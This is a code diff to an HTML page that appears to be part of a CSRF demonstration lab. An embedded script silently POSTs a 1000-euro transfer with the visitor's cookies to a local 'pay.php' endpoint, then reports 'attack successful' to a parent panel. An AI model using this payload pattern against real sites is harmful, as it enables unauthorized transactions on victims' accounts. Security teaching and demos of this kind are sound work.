@@ -9,15 +9,27 @@
 
   <!-- Realistic POST-based CSRF attack (silent and automatic) -->
   <script>
-fetch("../server/pay.php", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/x-www-form-urlencoded"
-  },
-  credentials: "include", //Auto-carrying cookies
-  body: "money=1000"
-});
+    // Launch the CSRF attack
+    fetch("../server/pay.php", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      credentials: "include", // automatically include cookies
+      body: "money=1000"  // simulate CSRF attack: transfer 1000 Euros
+    })
+    .then(response => response.text())  // get server response
+    .then(result => {
+      // After success, send a message to the parent page (panel.html) to update the log
+      window.parent.postMessage({
+        type: 'TRANSFER_LOG',  // type of transfer log
+        message: ` POST-based CSRF Transfer: 1000 Euros to attacker123456 | Time: ${new Date().toLocaleString()}`
+      }, "*");
 
+      // Update the parent page status to Attacked
+      window.parent.setStatus(true);  // attack successful, status = Attacked
+    })
+    .catch(error => console.error('Error:', error));
   </script>
 
   <p>If the page does not respond for a long time, please do not close the window.</p>
